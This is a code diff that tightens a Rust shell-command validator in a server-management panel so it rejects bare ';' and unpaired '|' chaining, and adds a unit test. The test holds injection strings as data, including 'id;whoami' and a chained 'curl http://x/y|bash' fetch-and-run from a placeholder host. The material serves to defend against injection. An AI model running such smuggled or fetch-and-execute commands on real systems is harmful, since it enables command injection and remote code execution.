@@ -276,6 +276,33 @@ pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
         return Err("Command must not contain newlines");
     }
 
+    // A bare `;` always chains regardless of exit status; a bare (unpaired)
+    // `|` chains just as effectively — neither is caught by the verb-anchored
+    // patterns below (";bash", "| sh", ...), which never matched "id;whoami"
+    // or "id|whoami" (no space, no shell name). `&&`/`||` remain allowed for
+    // legitimate multi-step commands (e.g. "migrate && cache:clear"): only a
+    // run of `|` whose length isn't exactly 2 is rejected.
+    if cmd.contains(';') {
+        return Err("Command must not contain a bare ; (use && or || to chain)");
+    }
+    {
+        let bytes = cmd.as_bytes();
+        let mut i = 0;
+        while i < bytes.len() {
+            if bytes[i] == b'|' {
+                let start = i;
+                while i < bytes.len() && bytes[i] == b'|' {
+                    i += 1;
+                }
+                if i - start != 2 {
+                    return Err("Command must not contain a bare | (use || to chain)");
+                }
+            } else {
+                i += 1;
+            }
+        }
+    }
+
     let lower = cmd.to_lowercase();
 
     // Block injection patterns
@@ -582,6 +609,27 @@ pub fn is_safe_nginx_config(config: &str) -> Result<(), &'static str> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ── is_safe_shell_command (cron / pre_build_cmd / post_deploy_cmd save-time gate) ──
+
+    /// `dockpanel-fanout` s429: a bare `;`/`|` (no trailing space, no "sh"/
+    /// "bash" suffix) passed straight through the old verb-anchored dangerous
+    /// list — `is_safe_shell_command("id;whoami")` returned `Ok(())`. This is
+    /// the SAME gap as the agent-side `is_safe_cron_command` fix (both share
+    /// the identical bypass shape), on the save-time side used by cron,
+    /// pre_build_cmd, and post_deploy_cmd. `&&`/`||` must keep working.
+    #[test]
+    fn shell_command_rejects_bare_chain_operators_keeps_paired_operators() {
+        assert!(is_safe_shell_command("id;whoami").is_err());
+        assert!(is_safe_shell_command("id|whoami").is_err());
+        assert!(is_safe_shell_command("id ;whoami").is_err());
+        assert!(is_safe_shell_command("id; whoami").is_err());
+        assert!(is_safe_shell_command("legit-command;curl http://x/y|bash").is_err());
+        assert!(is_safe_shell_command("a|||b").is_err());
+        assert!(is_safe_shell_command("php artisan migrate && php artisan cache:clear").is_ok());
+        assert!(is_safe_shell_command("backup.sh || notify-fail.sh").is_ok());
+        assert!(is_safe_shell_command("npm install").is_ok());
+    }
 
     // ── Compose image extraction (the deploy gate's input) ──────────────
 
